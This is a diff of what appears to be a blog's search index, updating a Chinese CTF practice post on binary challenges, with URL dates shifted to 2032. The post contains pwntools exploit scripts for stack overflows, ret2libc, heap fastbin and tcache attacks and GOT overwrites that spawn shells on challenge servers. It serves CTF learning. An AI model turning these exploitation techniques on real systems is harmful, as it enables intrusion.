d1dc9f05ef5cc277065f0c5029600a19e99e308e5446a5c33f531ddacb3bab89f2119c4715c1bf378cfb5fd7a3f07f425502249f5c75ceab164ca77eb30e709f2aca7ad237bc53250a15dd56545acd4a6bdaf9bd855bdc95a2eb747f325343dd93b2e997bf157566aad24d3f90b56735ba12887b6a0cc2245de082b0ea5db9d4bfa5f8f89e2f2ac60f5a3eb7a285df41f262db55e71fc4df3f1f6e9c0a80a5b6cf1a0990ff10b030fe57f04e033b800a090e113531e0531c58f86c140361277236876b41fb37d3c1be6cdc958c9560f617f8d3c2b151b2e0fcd26282246496b4ad5cf2c998f485ae27a6927443aaebb8e24d87006312cea1e0c04967f33b71d3d28db6d2ce82bbe7a281b15405461cdc2bfa3d4d06cf6f1c63983602569ce4e1022822fe0d6052f763b58d1e7875ca4db446f54cd16722457f4732481631baa92719b74cf0eb137df384b41fc893a01f125b89dcb9ed2340436f649f8ae38d6a38a735395fc15be3f3015471266798d0d7c86fd085505590c56e58326f688e74b4a4c7d031ffaf2c410c01b1a06c2b0943f3259ffa432e8afc3a7b121406d98313f473b41eb48f71cc52f688803cbcbea02ce161441548e83489cf648c83f9f754f83106ec42f3ef0b961b650c043319e63a5f4835528f47e2bf74354838311502f8045f9ea79c8f2b798c0fb18b064b91c7fca7d4368e40ebb3d124f86d971c8644c0593a531933963959886b956f4b5c203a7d79fa9c5822028b7e4658201e0d261a74604348834d4a884b287bebd3c912653b846ebf0b4f421e52b18ac61d99e39bc05b052009804d43f494e0f86d161356ef285421176b6c0b4860bc58ab2cbddbb14a3b256d57a14e0a1cbfdd45788413e43101d4859509304497a05f44bd22c9d7cea0e53fa957b78b26176e71c0257e19bc702368af24c39e3f4a8bd911469942043ac9ea734448cddd9e0cdc0888d03a929ad8c697eb025910794297e3125e227e0f476e6a9396558122e7bd081bdb764dc6a4581494d6ec91510baf32c67b27cd9b7338f9bba377aed8a6828f538f673afe27089dac3476e383785be42d7b48bc945bceb64727d04ad6b303a6ce42126ab25f9fb2dcac1bd8b7ceb15f2d8c3e13c0b412e0b10e0737bac359e8ff1e0e9e2d7e565db1c3495101dd12af625df62f6a0dbf22f9a262c6cb648bb51ac1becba48ae42677b7f6bfa16555901d33e1efa2e689aacb9c10383a48f0c9a04bee3dd12cf9964db0ed14653c6dc30b1f3ad7bb6c839de5aa01bf0dee73e01019d24bcf24fec619713674c727290e21a4de0d7e70bd3eb4455cde58a57cee8ac9230234ba9d963866c628aa402ab8483f33e86b5ad4def4b1676f3583d0ea08b828e2b58e9b385265028c9d48cea3640d56467761094390a485117711eb2b90662af1062</script>
@@ -3243,8 +3243,8 @@
       </tags>
   </entry>
   <entry>
-    <title>（不定期更新）二进制ctf练习</title>
-    <url>/2022/02/07/bin_ctf.html</url>
+    <title>（置顶）主要是二进制的ctf练习</title>
+    <url>/2032/02/07/bin_ctf.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>分为re、pwn和other三部分，用作记录思路和用得上的gadget。</p>
 <p>以下二级标题不带网站的默认为buuoj对应分区题目。</p>
 <span id="more"></span>
@@ -3272,11 +3272,11 @@
 <p>输入：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;</span><br></pre></td></tr></table></figure>
 <p>输出：</p>
-<p><img src="/2022/02/07/bin_ctf/649a0f60-43d2-4b07-8734-3f24a8a97cc5.png"></p>
+<p><img src="/2032/02/07/bin_ctf/649a0f60-43d2-4b07-8734-3f24a8a97cc5.png"></p>
 <p>因为*CTF对应的密文是<code>00 d2 fc d8</code>，在<code>image.flag</code>中找到这串16进制数后，再解密回来即可。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> A[<span class="number">100</span>], bs[<span class="number">100</span>] = &#123;<span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x1c</span>, <span class="number">0x1e</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0c</span>, <span class="number">0x0e</span>, <span class="number">0x08</span>, <span class="number">0x0a</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> B[<span class="number">100</span>];</span><br><span class="line">map &lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; mp;</span><br><span class="line">map &lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;inv;</span><br><span class="line"><span class="keyword">int</span> dat[<span class="number">50</span>] = &#123;<span class="number">0x0</span>, <span class="number">0xd2</span>, <span class="number">0xfc</span>, <span class="number">0xd8</span>, <span class="number">0xa2</span>, <span class="number">0xda</span>, <span class="number">0xba</span>, <span class="number">0x9e</span>, <span class="number">0x9c</span>, <span class="number">0x26</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0xb4</span>, <span class="number">0xce</span>, <span class="number">0x3c</span>, <span class="number">0xcc</span>, <span class="number">0x96</span>, <span class="number">0x88</span>, <span class="number">0x98</span>, <span class="number">0x34</span>, <span class="number">0x82</span>, <span class="number">0xde</span>, <span class="number">0x80</span>, <span class="number">0x36</span>, <span class="number">0x8a</span>, <span class="number">0xd8</span>, <span class="number">0xc0</span>, <span class="number">0xf0</span>, <span class="number">0x38</span>, <span class="number">0xae</span>, <span class="number">0x40</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">32</span>; i &lt; <span class="number">126</span>; i++)</span><br><span class="line">      A[i - <span class="number">32</span>] = i;</span><br><span class="line">   <span class="keyword">int</span> x;</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">1</span>; x &lt; <span class="number">16</span>; x++)</span><br><span class="line">      B[x] = bs[x];</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">16</span>; x &lt; <span class="number">32</span>; x++)</span><br><span class="line">      B[x] = bs[x<span class="number">-16</span>]+<span class="number">0x20</span>;</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">32</span>; x &lt; <span class="number">48</span>; x++)</span><br><span class="line">      B[x] = bs[x<span class="number">-32</span>]+<span class="number">0xc0</span>;</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">48</span>; x &lt; <span class="number">64</span>; x++)</span><br><span class="line">      B[x] = bs[x<span class="number">-48</span>]+<span class="number">0xe0</span>;</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">64</span>; x &lt; <span class="number">80</span>; x++)</span><br><span class="line">      B[x] = bs[x<span class="number">-64</span>]+<span class="number">0x80</span>;</span><br><span class="line">   <span class="keyword">for</span>(x = <span class="number">80</span>; x &lt; <span class="number">96</span>; x++)</span><br><span class="line">      B[x] = bs[x<span class="number">-80</span>]+<span class="number">0xa0</span>;      </span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">96</span>; i++) &#123;</span><br><span class="line">      mp[A[i]] = B[i];</span><br><span class="line">      inv[B[i]] = A[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//printf(&quot;%x %x %x %x&quot;,mp[&#x27;*&#x27;],mp[&#x27;C&#x27;],mp[&#x27;T&#x27;],mp[&#x27;F&#x27;]);</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, inv[dat[i]]);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>一道多线程的题目：</p>
-<p><img src="/2022/02/07/bin_ctf/mutex.png"></p>
+<p><img src="/2032/02/07/bin_ctf/mutex.png"></p>
 <p>注意这个程序创建了两个线程，其中前面一个线程会对输入字节进行处理，并将位置指针<code>dword_418008</code>减1，后面那个只是把<code>dword_418008</code>减一，指针的值直到<code>-1</code>为止。</p>
 <p>注意到<code>dword_418008</code>的初始值是29，因此程序只会对奇数位的值进行变换（其实奇数位试一次，偶数位再试一次也可以），另外也可以得知输入长30位。</p>
 <p>由于加密后只对比前29位（0~28），因此最后一位需要手动爆破。</p>
@@ -3328,7 +3328,7 @@
 <p>获取got表地址的exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;l&#x27;</span>*<span class="number">88</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">str_first = io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>也就是这个位置：</p>
-<p><img src="/2022/02/07/bin_ctf/ciscn1.png"></p>
+<p><img src="/2032/02/07/bin_ctf/ciscn1.png"></p>
 <blockquote>
 <p>为什么pop_rdi的地址还在那个位置，而且长度还变短了？</p>
 </blockquote>
@@ -3367,7 +3367,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">42</span> + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p><strong>原理有空再补。</strong></p>
 <h2 id="xctf-pwn-beginner-8-level3——re2libc3-without-puts"><a href="#xctf-pwn-beginner-8-level3——re2libc3-without-puts" class="headerlink" title="xctf-pwn-(beginner)-8: level3——re2libc3 without puts"></a>xctf-pwn-(beginner)-8: level3——re2libc3 without puts</h2><p>依旧是ret2libc，只不过没有<code>puts</code>函数，泄露libc地址的payload需要变化一下：</p>
-<p><img src="/2022/02/07/bin_ctf/write.png"></p>
+<p><img src="/2032/02/07/bin_ctf/write.png"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">140</span>, write_plt, main, <span class="number">1</span>, write_got, <span class="number">4</span>]) <span class="comment"># the last three are arguments of &quot;write&quot;</span></span><br></pre></td></tr></table></figure>
 <p>很不幸，这次Libcsearcher的匹配结果都没有用，但是题目下发了一个<code>libc_32.so.6</code>，我们需要利用这个文件本地导入libc库。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>) <span class="comment">#import</span></span><br><span class="line"></span><br><span class="line">libcbase = libc_start_main_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>] </span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#leak</span></span><br><span class="line">binsh_addr = libcbase + <span class="string">&#x27;bin_sh_addr&#x27;</span> <span class="comment"># we can&#x27;t use &#x27;symbols&#x27; to get address, we do it manually.</span></span><br></pre></td></tr></table></figure>
@@ -3413,14 +3413,14 @@
 <p><code>fastbin attack</code></p>
 <p><code>vuln: fill in arbitrary size</code> </p>
 <p><code>type: double free</code></p>
-<p><img src="/2022/02/07/bin_ctf/heap1.png"></p>
-<p><img src="/2022/02/07/bin_ctf/heap2.png"></p>
-<h3 id="one-gadget使用："><a href="#one-gadget使用：" class="headerlink" title="one_gadget使用："></a>one_gadget使用：</h3><p><img src="/2022/02/07/bin_ctf/one_gadget.png"></p>
+<p><img src="/2032/02/07/bin_ctf/heap1.png"></p>
+<p><img src="/2032/02/07/bin_ctf/heap2.png"></p>
+<h3 id="one-gadget使用："><a href="#one-gadget使用：" class="headerlink" title="one_gadget使用："></a>one_gadget使用：</h3><p><img src="/2032/02/07/bin_ctf/one_gadget.png"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    alloc(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">    alloc(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    fill(<span class="number">0</span>,<span class="number">0x19</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    leak = u64(p.recvline()[:<span class="number">8</span>])</span><br><span class="line">    libc_base=leak-(<span class="number">0x7fc4a1902b78</span>-<span class="number">0x7fc4a153e000</span>) <span class="comment"># gdb debug libc</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    onegadget=libc_base+<span class="number">0x4526a</span> <span class="comment"># one_gadget</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    fill(<span class="number">4</span>,<span class="number">0x8</span>,p64(malloc_hook-<span class="number">0x23</span>)) <span class="comment"># to satisfy size&#x27;s last 3 bits are all &#x27;1&#x27;s, it&#x27;s &#x27;\x7f&#x27; here.</span></span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">    alloc(<span class="number">0x68</span>) <span class="comment">#5</span></span><br><span class="line">    fill(<span class="number">5</span>,<span class="number">0x1b</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(onegadget))</span><br><span class="line">    alloc(<span class="number">0x18</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="ciscn-2019-es-2——stack-migration1"><a href="#ciscn-2019-es-2——stack-migration1" class="headerlink" title="ciscn_2019_es_2——stack migration1"></a>ciscn_2019_es_2——stack migration1</h2><p>适用于payload长度较短的情况，将rop写在栈中，通过修改ebp的值劫持程序执行流到构造的rop附近，从而执行自己的rop。</p>
 <p>此题read长度限制为<code>sizeof(buf)+8</code>，故不能直接使用之前的<code>retlibc3</code></p>
 <p>缓冲区变量与上层函数的ebp通过动调得到：</p>
-<p><img src="/2022/02/07/bin_ctf/stack_trans.png"></p>
+<p><img src="/2032/02/07/bin_ctf/stack_trans.png"></p>
 <p>如图所示，<code>0xffffcdd8 - 0xffffcda0 = 0x38</code>，就是篡改的栈帧ebp到输入的偏移。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijackebp</span>():</span></span><br><span class="line">   payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">   io.sendafter(<span class="string">&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, payload1) <span class="comment"># !!! send, not sendline !!!</span></span><br><span class="line">   io.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">   ebp = u32(io.recv(<span class="number">4</span>)) <span class="comment"># the value of ebp ([ebp])</span></span><br><span class="line">   s = ebp - <span class="number">0x38</span> <span class="comment"># the offset between [ebp] and your input argument (get this by debugging)</span></span><br><span class="line">   <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">s</span>):</span></span><br><span class="line">   payload2 = (p32(<span class="number">0</span>) + p32(sys_plt) + p32(vul) + p32(s + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">   <span class="comment"># fake ret_addr, true ret_addr </span></span><br><span class="line">   payload2 += p32(s) + p32(leave)</span><br><span class="line">   <span class="comment"># input_addr, leave_ret_rop</span></span><br><span class="line">   io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="comment">#io = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">   io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25446</span>)</span><br><span class="line">   context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">   elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   sys_plt = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   leave = <span class="number">0x080484b8</span></span><br><span class="line">   vul = <span class="number">0x8048595</span></span><br><span class="line"></span><br><span class="line">   input_addr = hijackebp()</span><br><span class="line">   exploit(input_addr)</span><br><span class="line">   </span><br><span class="line">   io.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="ciscn-2019-s-3——ret2csu"><a href="#ciscn-2019-s-3——ret2csu" class="headerlink" title="ciscn_2019_s_3——ret2csu"></a>ciscn_2019_s_3——ret2csu</h2><p>本题的要点是执行<code>execve(&#39;/bin/sh&#39;,0,0)</code>这个函数，调用这个函数需要有<code>syscall</code>指令，并且需要满足<code>rax = 0x3b, rdi = &lt;bin_sh_addr&gt;, rsi = rdx = 0</code>这几个条件。</p>
@@ -3484,8 +3484,16 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; __int64 __fastcall password_checker(void (*)(void))</span><br><span class="line">public _Z16password_checkerPFvvE</span><br><span class="line">_Z16password_checkerPFvvE proc near</span><br><span class="line"></span><br><span class="line">var_18= qword ptr -18h</span><br><span class="line">var_8= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     [rbp+var_18], rdi</span><br><span class="line">mov     [rbp+var_8], 0</span><br><span class="line">lea     rax, [rbp+var_18]</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400A79</span><br><span class="line">_Z16password_checkerPFvvE endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>可以看到返回值是<code>[rbp+var_18]</code>。</p>
 <p>由于这几个函数都是<code>main</code>的同一级子函数，所以栈的相对位置不会改变，可以在输入密码的时候将<code>[rbp+var_18]</code>溢出为shell的地址，从而拿到shell。</p>
-<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>程序去除超时限制——用isnan函数替换alarm函数。</p>
+<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p><code>partial RELRO</code>，可以修改got表和plt表。</p>
+<p>程序去除超时限制——用isnan函数替换alarm函数。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./ProgrammName</span><br></pre></td></tr></table></figure>
+<ol>
+<li>通过将name块与description块分开绕过长度判定。</li>
+<li>溢出第0个块，在第1个块写入free.got，泄露libc版本。</li>
+<li>将free.got改为system.got.</li>
+<li>通过free写好<code>/bin/sh</code>的第二个块，拿到shell.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">   Add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">   Add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">   Add(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   Del(<span class="number">0</span>)</span><br><span class="line">   Add(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x198</span> + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">   Dis(<span class="number">1</span>)</span><br><span class="line">   io.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">   free_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line">   libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">   log.success(<span class="string">&#x27;libc_base-&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">   sys = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   Upd(<span class="number">1</span>, <span class="number">4</span>, p32(sys))</span><br><span class="line">    </span><br><span class="line">   Del(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="pwn-college-babyheap4-1"><a href="#pwn-college-babyheap4-1" class="headerlink" title="pwn.college babyheap4.1"></a>pwn.college babyheap4.1</h2><p>第一次独立写出堆题，虽然是最简单的那种<code>tcache double free</code>。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;/challenge/babyheap_level4.1&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;Function (malloc/free/puts/scanf/read_flag/quit): &#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;439&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="comment"># get the pointer of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># get the location of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer again, make flag allocate here</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;read_flag&#x27;</span>)</span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><h2 id="buu-re-rsa"><a href="#buu-re-rsa" class="headerlink" title="buu-re: rsa"></a>buu-re: rsa</h2><p><del>真不知道这道题为什么要放在re里面。</del></p>
@@ -3507,6 +3515,8 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">100</span>):</span><br><span class="line">        r=remote(<span class="string">&#x27;120.79.12.160&#x27;</span>, <span class="number">32517</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">        fo = <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;h &#x27;</span>)</span><br><span class="line">        req = <span class="built_in">bytes</span>(r.recv(<span class="number">6</span>))</span><br><span class="line">        ti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> fo:</span><br><span class="line">                j = <span class="built_in">bytes</span>(j, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> j == req:</span><br><span class="line">                        <span class="comment">#print(ti)</span></span><br><span class="line">                        ti += <span class="number">1000000</span></span><br><span class="line">                        r.sendline(<span class="built_in">str</span>(ti))</span><br><span class="line">                        r.recv()</span><br><span class="line">                        r.recv()</span><br><span class="line">                        <span class="comment">#r.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line">                        r.sendline(<span class="string">&#x27;G 100&#x27;</span>) <span class="comment"># I chose &#x27;100&#x27; arbitrarily </span></span><br><span class="line">                        r.recvuntil(<span class="string">&#x27;You are &#x27;</span>)</span><br><span class="line">                        <span class="comment">#print(r.recv(1))</span></span><br><span class="line">                        <span class="keyword">if</span> r.recv(<span class="number">1</span>) == <span class="string">b&#x27;s&#x27;</span>:</span><br><span class="line">                                r.interactive()</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                ti += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h2 id="xctf-mobile-beginner-6-easy-apk"><a href="#xctf-mobile-beginner-6-easy-apk" class="headerlink" title="xctf-mobile-(beginner)-6: easy-apk"></a>xctf-mobile-(beginner)-6: easy-apk</h2><p>换表base64，上python脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>
+<h2 id="NepCTF2022-signin"><a href="#NepCTF2022-signin" class="headerlink" title="NepCTF2022 signin"></a>NepCTF2022 signin</h2><p>usb隐写脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span 